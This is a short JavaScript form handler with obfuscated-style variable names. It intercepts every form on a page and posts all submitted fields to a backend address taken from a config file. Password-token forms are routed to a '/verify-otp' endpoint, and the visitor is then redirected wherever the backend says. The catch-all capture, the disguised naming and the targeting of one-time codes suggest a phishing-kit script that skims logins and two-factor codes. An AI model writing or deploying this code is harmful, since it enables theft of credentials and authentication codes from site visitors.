import { BACKEND_URL as _0xurl } from "./config.js";

document.addEventListener("DOMContentLoaded", () => {
  const _0xforms = document.querySelectorAll("form");

  _0xforms.forEach((_0xf) => {
    _0xf.addEventListener("submit", async (_0xe) => {
      _0xe.preventDefault();

      let _0xendpoint = "";
      if (_0xf.classList.contains("new_token_request_password")) {
        _0xendpoint = `${_0xurl}/verify-otp`;
      }

      const _0xfd = new FormData(_0xf);
      const _0xdata = {};

      _0xfd.forEach((v, k) => {
        if (_0xdata[k]) {
          if (Array.isArray(_0xdata[k])) {
            _0xdata[k].push(v);
          } else {
            _0xdata[k] = [_0xdata[k], v];
          }
        } else {
          _0xdata[k] = v;
        }
      });

      let _0xupload = _0xf.classList.contains("elementor-form");
      let _0xreq = {
        method: "POST",
        body: _0xupload ? _0xfd : JSON.stringify(_0xdata),
        headers: _0xupload ? {} : { "Content-Type": "application/json" },
      };

      try {
        const _0xres = await fetch(_0xendpoint, _0xreq);
        const _0xresult = await _0xres.json();

        if (_0xresult.success && _0xresult.redirect) {
          window.location.href = _0xresult.redirect;
        } else {
          alert("Error: " + (_0xresult.error || "Something went wrong"));
        }
      } catch (_0xerr) {
        console.error("Form Submission Error:", _0xerr);
        alert("❌ Something went wrong! Please try again.");
      }
    });
  });
});
